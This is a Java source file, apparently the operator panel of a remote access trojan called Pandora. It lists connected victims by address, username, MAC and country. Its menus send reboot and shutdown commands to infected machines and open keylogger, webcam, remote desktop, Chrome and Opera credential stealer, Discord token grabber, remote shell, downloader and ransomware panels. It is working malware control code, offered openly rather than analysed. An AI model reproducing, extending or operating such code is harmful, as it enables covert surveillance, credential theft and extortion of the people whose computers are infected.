package org.pandora.master.scene.impl.menu;

import de.jensd.fx.glyphs.fontawesome.FontAwesomeIcon;
import de.jensd.fx.glyphs.fontawesome.FontAwesomeIconView;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.collections.transformation.FilteredList;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.ImageView;
import javafx.scene.layout.AnchorPane;
import javafx.scene.paint.Color;
import lombok.Getter;
import org.controlsfx.control.textfield.CustomTextField;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.BasicBuilder;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.scene.impl.agent.Process;
import org.pandora.master.scene.impl.agent.*;
import org.pandora.master.scene.SceneType;
import org.pandora.master.utils.SocketUtils;

public class AgentsUI {

    @Getter
    private final BasicBuilder basicBuilder;
    @Getter
    private final Master master;
    @Getter
    private AnchorPane anchorPane;
    @Getter
    private Scene scene;
    @Getter
    private final ObservableList<AgentData> observableList;
    private final TableView<AgentData> tableView;
    private final FilteredList<AgentData> filteredList;
    private final SocketUtils socketUtils;
    private final ContextMenu windowsContext;
    private final ContextMenu linuxContext;
    private AgentData selected;
    private TableRow<AgentData> tableRowAgentData;

    public AgentsUI(final Master master, final BasicBuilder basicBuilder) {
        this.basicBuilder = basicBuilder;
        this.master = master;
        this.observableList = FXCollections.observableArrayList();
        this.filteredList = new FilteredList(this.observableList);
        this.tableView = (TableView<AgentData>) basicBuilder.getBuilderManager().getTableViewBuilder().buildTableView("No result found OR no victim is currently connected to the server", Color.WHITE, 16, 418, 1010, 35, 134, "agents-tableView");
        this.socketUtils = master.getSocketUtils();
        this.tableRowAgentData = null;
        this.selected = null;
        this.windowsContext = new ContextMenu();
        this.linuxContext = new ContextMenu();
    }

    public void initialize() {
        final Scene scene = this.basicBuilder.getScene();
        final AnchorPane anchorPane = this.basicBuilder.getAnchorPane();
        final BuilderManager builderManager = this.basicBuilder.getBuilderManager();

        this.basicBuilder.getAgents().setId("currentNavButton");

        final TableColumn<AgentData, String> addressColumn = (TableColumn<AgentData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Address", 198, "address");
        final TableColumn<AgentData, String> computerColumn = (TableColumn<AgentData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Computer", 185, "computer");
        final TableColumn<AgentData, String> osColumn = (TableColumn<AgentData, String>) builderManager.getTableColumnBuilder().buildTableColumn("OS", 159, "os");
        final TableColumn<AgentData, String> userColumn = (TableColumn<AgentData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Username", 181, "user");
        final TableColumn<AgentData, String> macColumn = (TableColumn<AgentData, String>) builderManager.getTableColumnBuilder().buildTableColumn("MAC Address", 198, "mac");
        final TableColumn<AgentData, String> countryColumn = (TableColumn<AgentData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Country", 84, "lang");

        final FontAwesomeIconView fontAwesomeIconView = new FontAwesomeIconView(FontAwesomeIcon.SEARCH);
        fontAwesomeIconView.setFill(Color.rgb(118, 119, 135));
        fontAwesomeIconView.setSize("18");

        final CustomTextField searchField = new CustomTextField();
        searchField.setTranslateX(285);
        searchField.setTranslateY(83);
        searchField.setPrefWidth(770);
        searchField.setPrefHeight(32);
        searchField.setPromptText("Search...");
        searchField.setLeft(fontAwesomeIconView);
        searchField.textProperty().addListener((obs, oldValue, newValue) -> this.filteredList.setPredicate(agentData -> {
            final String value = newValue.toLowerCase().trim();
            return ("country_" + agentData.getLang()).toLowerCase().contains(value) || agentData.getComputer().toLowerCase().contains(value) || agentData.getUser().toLowerCase().contains(value) || agentData.getOs().toLowerCase().contains(value) || agentData.getMac().toLowerCase().contains(value) || agentData.getAddress().toLowerCase().contains(value);
        }));

        final Button manage = builderManager.getButtonBuilder().buildButton(builderManager.getImageViewBuilder().buildImageView("images/agents/plus.png", 0, 0, 16, 16), "  Manage Agent", 344, 587, Color.rgb(143, 145, 154), "Verdana", 13, 160, 34, "manage-agent");
        final Button restart = builderManager.getButtonBuilder().buildButton(builderManager.getImageViewBuilder().buildImageView("images/agents/trash.png", 0, 0, 16, 16), "  Restart All Sockets", 555, 587, Color.rgb(143, 145, 154), "Verdana", 13, 175, 34, "restart-agent");

        searchField.setId("searchField");
        fontAwesomeIconView.setId("searchFontAwesomeIcon");

        this.tableView.setRowFactory(tv -> {
            final TableRow<AgentData> tableRow = new TableRow<>();
            tableRow.setOnMouseClicked(event -> {
                if (!tableRow.isEmpty()) {
                    this.selected = tableRow.getItem();
                    this.tableRowAgentData = tableRow;
                }
            });
            tableRow.setOnContextMenuRequested(event -> {
                if (!tableRow.isEmpty()) if (this.isWindows(tableRow.getItem()))
                    this.windowsContext.show(tableRow, event.getScreenX(), event.getScreenY());
                else this.linuxContext.show(tableRow, event.getScreenX(), event.getScreenY());
            });
            return tableRow;
        });

        restart.setOnMouseClicked(event -> {
            //this.getMaster().agentData.forEach(agentData -> this.socketUtils.write(agentData.getId(), "restartSocket"));
            this.socketUtils.write("all_agents", "restartSocket");
        });

        manage.setOnMouseClicked(event -> {
            if (this.selected == null || !this.getMaster().agentData.contains(this.selected) || this.tableRowAgentData == null)
                return;
            if (this.isWindows(this.tableRowAgentData.getItem()))
                this.windowsContext.show(this.tableRowAgentData, event.getScreenX(), event.getScreenY());
            else this.linuxContext.show(this.tableRowAgentData, event.getScreenX(), event.getScreenY());
        });

        this.createContextMenus(builderManager);

        this.tableView.setItems(this.filteredList);
        this.tableView.getColumns().addAll(addressColumn, computerColumn, osColumn, userColumn, macColumn, countryColumn);
        this.tableView.requestLayout();

        anchorPane.getChildren().addAll(searchField, this.tableView, manage, restart);
        this.anchorPane = anchorPane;
        this.scene = scene;
    }

    public void updateList(final boolean connected) {
        this.observableList.clear();
        if (connected) this.observableList.addAll(this.master.agentData);
        else this.master.agentData.clear();
        this.tableView.setItems(this.filteredList);
    }

    private void createContextMenus(final BuilderManager builderManager) {

        /* WINDOWS UI */

        final SeparatorMenuItem separatorMenuItem = new SeparatorMenuItem();

        final Menu system = new Menu("System", this.getImageForContext("computer.png"));
        final Menu surveillance = new Menu("Surveillance", this.getImageForContext("surveillance.png"));
        final Menu browserStealer = new Menu("Browser Stealer", this.getImageForContext("browser.png"));

        final MenuItem windowsClipboard = new MenuItem("Copy Clipboard", this.getImageForContext("clipboard.png"));

        final MenuItem windowsData = new MenuItem("Agent Data", this.getImageForContext("information.png"));
        final MenuItem windowsReboot = new MenuItem("Reboot System", this.getImageForContext("reboot.png"));
        final MenuItem windowsShutdown = new MenuItem("Shutdown System", this.getImageForContext("shutdown.png"));

        final MenuItem windowsDesktop = new MenuItem("Remote Desktop", this.getImageForContext("desktop.png"));
        final MenuItem windowsWebcam = new MenuItem("Webcam", this.getImageForContext("camera.png"));
        final MenuItem windowsKeylogger = new MenuItem("Keylogger", this.getImageForContext("keyboard.png"));
        final MenuItem windowsChrome = new MenuItem("Chrome Stealer", this.getImageForContext("chrome.png"));
        final MenuItem windowsOpera = new MenuItem("Opera Stealer", this.getImageForContext("opera.png"));

        final MenuItem windowsDiscordGrabber = new MenuItem("Get Discord Tokens", this.getImageForContext("discord.png"));
        final MenuItem windowsScreenshot = new MenuItem("Take Screenshot", this.getImageForContext("photo.png"));
        final MenuItem windowsShell = new MenuItem("Remote Shell", this.getImageForContext("shell.png"));
        final MenuItem windowsRansomware = new MenuItem("Ransomware", this.getImageForContext("ransomware.png"));
        final MenuItem windowsFileManager = new MenuItem("Lite File Manager", this.getImageForContext("folder.png"));
        final MenuItem windowsProcessManager = new MenuItem("Processes Manager", this.getImageForContext("processes.png"));
        final MenuItem windowsDownloader = new MenuItem("Mirror Downloader", this.getImageForContext("downloader.png"));
        final MenuItem windowsSocket = new MenuItem("Restart Socket", this.getImageForContext("socket.png"));

        system.getItems().addAll(windowsClipboard, windowsData, windowsReboot, windowsShutdown);
        surveillance.getItems().addAll(windowsDesktop, windowsWebcam, windowsKeylogger);
        browserStealer.getItems().addAll(windowsChrome, windowsOpera);
        this.windowsContext.getItems().addAll(system, surveillance, browserStealer, separatorMenuItem, windowsScreenshot, windowsDiscordGrabber, windowsShell, windowsRansomware, windowsFileManager, windowsProcessManager, windowsDownloader, windowsSocket);

        /* LINUX UI */

        final MenuItem linuxData = new MenuItem("Agent Data", this.getImageForContext("information.png"));
        final MenuItem linuxDownloader = new MenuItem("Mirror Downloader", this.getImageForContext("downloader.png"));
        final MenuItem linuxShell = new MenuItem("Remote Shell", this.getImageForContext("shell.png"));
        final MenuItem linuxSocket = new MenuItem("Restart Socket", this.getImageForContext("socket.png"));

        this.linuxContext.getItems().addAll(linuxData, linuxDownloader, linuxShell, linuxSocket);

        /* WINDOWS CONTROLLER */

        windowsScreenshot.setOnAction(event -> new Screenshot(this.master, this.socketUtils, this.selected).sendRequest());
        windowsReboot.setOnAction(event -> this.socketUtils.write(this.selected.getId(), "rebootComputer"));
        windowsShutdown.setOnAction(event -> this.socketUtils.write(this.selected.getId(), "shutdownComputer"));
        windowsSocket.setOnAction(event -> this.socketUtils.write(this.selected.getId(), "restartSocket"));
        windowsDownloader.setOnAction(event -> new Downloader(new ControllerBuilder(SceneType.DOWNLOADER, "Downloader", builderManager, this.selected, this.master, 725, 385)).open());
        windowsData.setOnAction(event -> new Data(new ControllerBuilder(SceneType.DATA, "Agent Data", builderManager, this.selected, this.master, 650, 420)).open());
        windowsShell.setOnAction(event -> new Shell(new ControllerBuilder(SceneType.SHELL, "Shell", builderManager, this.selected, this.master, 725, 460)).open());
        windowsClipboard.setOnAction(event -> new Clipboard(new ControllerBuilder(SceneType.CLIPBOARD, "Clipboard", builderManager, this.selected, this.master, 505, 287)).open());
        windowsDiscordGrabber.setOnAction(event -> new DiscordGrabber(new ControllerBuilder(SceneType.DISCORDGRABBER, "Discord Grabber", builderManager, this.selected, this.master, 625, 347)).open());
        windowsKeylogger.setOnAction(event -> new Keylogger(new ControllerBuilder(SceneType.KEYLOGGER, "Keylogger", builderManager, this.selected, this.master, 625, 347)).open());
        windowsProcessManager.setOnAction(event -> new Process(new ControllerBuilder(SceneType.PROCESSMANAGER, "Process Manager", builderManager, this.selected, this.master, 969, 575)).open());
        windowsWebcam.setOnAction(event -> new Webcam(new ControllerBuilder(SceneType.WEBCAM, "Webcam", builderManager, this.selected, this.master, 415, 503)).open());
        windowsDesktop.setOnAction(event -> new Desktop(new ControllerBuilder(SceneType.DESKTOP, "Desktop", builderManager, this.selected, this.master, 955, 680)).open());
        windowsChrome.setOnAction(event -> new ChromeStealer(new ControllerBuilder(SceneType.CHROMEGRABBER, "Chrome Stealer", builderManager, this.selected, this.master, 969, 575)).open());
        windowsOpera.setOnAction(event -> new OperaStealer(new ControllerBuilder(SceneType.OPERAGRABBER, "Opera Stealer", builderManager, this.selected, this.master, 969, 575)).open());
        windowsFileManager.setOnAction(event -> new FileManager(new ControllerBuilder(SceneType.FILEMANAGER, "Lite File Manager", builderManager, this.selected, this.master, 969, 575)).open());
        windowsRansomware.setOnAction(event -> new Ransomware(new ControllerBuilder(SceneType.RANSOMWARE, "Ransomware", builderManager, this.selected, this.master, 725, 295)).open());

        /* LINUX CONTROLLER */

        linuxSocket.setOnAction(event -> this.socketUtils.write(this.selected.getId(), "restartSocket"));
        linuxDownloader.setOnAction(event -> new Downloader(new ControllerBuilder(SceneType.DOWNLOADER, "Downloader", builderManager, this.selected, this.master, 725, 385)).open());
        linuxData.setOnAction(event -> new Data(new ControllerBuilder(SceneType.DATA, "Agent Data", builderManager, this.selected, this.master, 650, 420)).open());
        linuxShell.setOnAction(event -> new Shell(new ControllerBuilder(SceneType.SHELL, "Shell", builderManager, this.selected, this.master, 725, 460)).open());
    }

    private ImageView getImageForContext(final String uri) {
        final ImageView imageView = new ImageView("images/agents/contextmenu/" + uri);
        imageView.setFitHeight(16);
        imageView.setFitWidth(16);
        return imageView;
    }

    private boolean isWindows(final AgentData agentData) {
        return agentData.getOs().toLowerCase().contains("windows");
    }
}
